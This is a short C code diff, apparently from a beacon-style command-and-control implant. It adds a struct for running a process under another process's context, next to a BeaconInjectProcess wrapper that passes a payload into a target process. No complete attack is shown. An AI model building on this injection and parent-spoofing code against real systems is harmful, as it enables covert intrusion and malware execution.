@@ -799,6 +799,13 @@ LPPROC_THREAD_ATTRIBUTE_LIST ProcThreadAttributeListInit(DWORD dwAttributeCount)
 
 	return attributeList;
 }
+typedef struct _RUN_UNDER_CONTEXT {
+	HANDLE handle;
+	ULONG64 processAttribute;
+	UINT previousErrorMode;
+	BOOL(WINAPI* updateProcessAttributes)(struct _RUN_UNDER_CONTEXT*, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFO*);
+	VOID(WINAPI* cleanup)(const struct _RUN_UNDER_CONTEXT*);
+} RUN_UNDER_CONTEXT, * PRUN_UNDER_CONTEXT;
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
